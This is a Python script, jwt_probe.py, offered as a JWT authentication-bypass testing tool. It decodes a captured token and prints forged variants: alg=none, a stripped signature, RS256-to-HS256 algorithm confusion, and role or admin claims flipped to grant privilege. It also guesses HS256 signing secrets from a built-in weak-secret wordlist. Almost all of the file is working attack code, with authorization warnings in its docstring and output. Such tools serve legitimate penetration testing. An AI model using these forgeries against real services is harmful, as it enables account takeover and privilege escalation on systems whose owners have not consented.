#!/usr/bin/env python3
"""
jwt_probe.py -- semi-automated JWT / auth-logic bypass checks.

USE ONLY AGAINST TARGETS YOU ARE AUTHORIZED TO TEST.

This wraps a handful of well-known JWT weaknesses into one pass over a
token you captured from your OWN authenticated session. It reports what
each tampered variant *would* send -- you still send it yourself (e.g. via
curl or Burp Repeater) and confirm the server's actual response before
calling anything a finding. That keeps a human in the loop for the part
that matters: deciding whether a bypass actually worked.

-----------------------------------------------------------------------------
CHECKS
-----------------------------------------------------------------------------
1. alg=none          -- strips the signature, sets header alg to "none"
2. alg confusion      -- if server uses RS256, tries re-signing as HS256
                          using the (sometimes-public) RSA public key as an
                          HMAC secret
3. signature stripped  -- removes the signature segment entirely
4. weak secret guess   -- tries a small built-in wordlist of common/weak
                          HMAC secrets against HS256 tokens
5. claim tampering     -- prints ready-made variants with common privilege
                          claims flipped (role/admin/isAdmin/scope), for
                          you to re-sign IF you already recovered the secret,
                          or to send unsigned if the app doesn't verify

-----------------------------------------------------------------------------
USAGE
-----------------------------------------------------------------------------
  python3 jwt_probe.py --token "eyJhbGciOi..."
  python3 jwt_probe.py --token "eyJhbGciOi..." --wordlist secrets.txt
  python3 jwt_probe.py --token "eyJhbGciOi..." --pubkey server_public.pem

Requires: pip install pyjwt
"""

import argparse
import base64
import json
import sys

try:
    import jwt as pyjwt
except ImportError:
    sys.exit("Missing dependency: pip install pyjwt")

COMMON_WEAK_SECRETS = [
    "secret", "changeme", "password", "123456", "key", "jwtsecret",
    "your-256-bit-secret", "test", "admin", "supersecret", "secretkey",
]

PRIV_CLAIM_CANDIDATES = ["role", "isAdmin", "admin", "scope", "permissions", "user_type"]


def b64url_decode(seg: str) -> bytes:
    pad = "=" * (-len(seg) % 4)
    return base64.urlsafe_b64decode(seg + pad)


def decode_unverified(token: str):
    header = json.loads(b64url_decode(token.split(".")[0]))
    payload = json.loads(b64url_decode(token.split(".")[1]))
    return header, payload


def check_alg_none(header, payload):
    h = dict(header)
    h["alg"] = "none"
    h_b64 = base64.urlsafe_b64encode(json.dumps(h).encode()).rstrip(b"=").decode()
    p_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=").decode()
    return f"{h_b64}.{p_b64}."


def check_sig_stripped(token):
    parts = token.split(".")
    return f"{parts[0]}.{parts[1]}."


def check_weak_secret(token, wordlist):
    hits = []
    for secret in wordlist:
        try:
            pyjwt.decode(token, secret, algorithms=["HS256"])
            hits.append(secret)
        except pyjwt.InvalidTokenError:
            continue
    return hits


def check_alg_confusion(header, payload, pubkey_pem):
    h = dict(header)
    h["alg"] = "HS256"
    try:
        forged = pyjwt.encode(payload, pubkey_pem, algorithm="HS256", headers=h)
        return forged
    except Exception as e:
        return f"(failed to build: {e})"


def suggest_claim_tamper(payload):
    suggestions = []
    for claim in PRIV_CLAIM_CANDIDATES:
        if claim in payload:
            tampered = dict(payload)
            if isinstance(payload[claim], bool):
                tampered[claim] = not payload[claim]
            elif isinstance(payload[claim], str):
                tampered[claim] = "admin"
            suggestions.append((claim, tampered))
    return suggestions


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                  formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--token", required=True)
    ap.add_argument("--wordlist", help="file of candidate HMAC secrets, one per line")
    ap.add_argument("--pubkey", help="PEM file, for RS256->HS256 alg-confusion test")
    args = ap.parse_args()

    header, payload = decode_unverified(args.token)
    print("[*] Header :", json.dumps(header))
    print("[*] Payload:", json.dumps(payload))
    print("\n!! Only send these against targets you are authorized to test.\n")

    print("[1] alg=none variant:")
    print("   ", check_alg_none(header, payload), "\n")

    print("[2] signature-stripped variant:")
    print("   ", check_sig_stripped(args.token), "\n")

    wordlist = COMMON_WEAK_SECRETS
    if args.wordlist:
        with open(args.wordlist) as f:
            wordlist = [line.strip() for line in f if line.strip()]
    print(f"[3] weak-secret guess ({len(wordlist)} candidates):")
    hits = check_weak_secret(args.token, wordlist)
    if hits:
        print("    !!! MATCHED SECRET(S):", hits)
    else:
        print("    no match in wordlist")
    print()

    if args.pubkey:
        with open(args.pubkey) as f:
            pubkey_pem = f.read()
        print("[4] alg-confusion (RS256 -> HS256 using pubkey as HMAC key):")
        print("   ", check_alg_confusion(header, payload, pubkey_pem), "\n")

    print("[5] privilege-claim tamper suggestions (needs a valid signing method):")
    for claim, tampered in suggest_claim_tamper(payload):
        print(f"    - flip '{claim}':", json.dumps(tampered))
    if not suggest_claim_tamper(payload):
        print("    (no common privilege claims found in payload)")


if __name__ == "__main__":
    main()
